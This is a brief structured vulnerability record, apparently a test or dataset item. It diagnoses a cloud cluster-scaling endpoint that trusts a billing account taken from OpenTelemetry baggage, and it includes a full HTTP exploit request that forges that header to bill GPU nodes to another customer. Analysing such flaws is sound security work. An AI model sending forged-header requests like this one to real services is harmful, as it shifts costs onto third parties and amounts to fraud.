diagnosis: The cloud cluster scaling endpoint reads billing.account from OpenTelemetry baggage and provisions expensive GPU/compute worker nodes billed to that account. Because baggage is accepted from external callers without authorization checks, an attacker can specify another customer's billing.account in the baggage header to bill compute infrastructure costs to a third party.
exploit_request:
POST /api/clusters/cls_dev_sandbox_01/scale HTTP/1.1
Host: cloud.infra.co
Authorization: Bearer dev_user_bearer_token
baggage: billing.account=acc_enterprise_corp_master
Content-Type: application/json

{"nodeCount": 32}
